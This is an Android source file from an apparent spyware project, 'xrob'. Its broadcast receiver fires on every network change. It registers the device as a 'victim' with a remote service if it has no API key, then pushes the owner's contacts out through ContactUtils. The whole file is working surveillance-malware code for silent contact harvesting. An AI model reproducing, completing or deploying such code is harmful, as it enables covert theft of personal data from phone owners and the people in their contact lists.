package com.theah64.xrob.receivers;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

import com.theah64.xrob.interfaces.JobListener;
import com.theah64.xrob.models.Victim;
import com.theah64.xrob.utils.ContactUtils;
import com.theah64.xrob.utils.NetworkUtils;
import com.theah64.xrob.utils.PrefUtils;

public class NetworkChangeReceiver extends BroadcastReceiver {

    private static final int MIN_THRESHOLD = 1000;
    private static final String X = NetworkChangeReceiver.class.getSimpleName();
    private static long lastUpdateTime = 0l;

    public NetworkChangeReceiver() {

    }

    @Override
    public void onReceive(final Context context, Intent intent) {

        Log.i(X, "Network changed...");



        if (NetworkUtils.hasNetwork(context)) {

            Log.i(X, "Has network");

            final PrefUtils prefUtils = PrefUtils.getInstance(context);
            final boolean hasApiKey = prefUtils.getString(Victim.KEY_API_KEY) != null;

            Log.d(X, "hasApiKey ? " + hasApiKey);

            if (hasApiKey) {

                //Do the jobs here
                ContactUtils.push(context);

            } else {

                Log.i(X, "Registering victim...");

                //Register victim here
                Victim.register(context, new JobListener() {
                    @Override
                    public void onJobStart() {

                    }

                    @Override
                    public void onJobFinish(String apiKey) {
                        ContactUtils.push(context);
                    }


                    @Override
                    public void onJobFailed(String reason) {

                    }

                });
            }

        }
    }
}
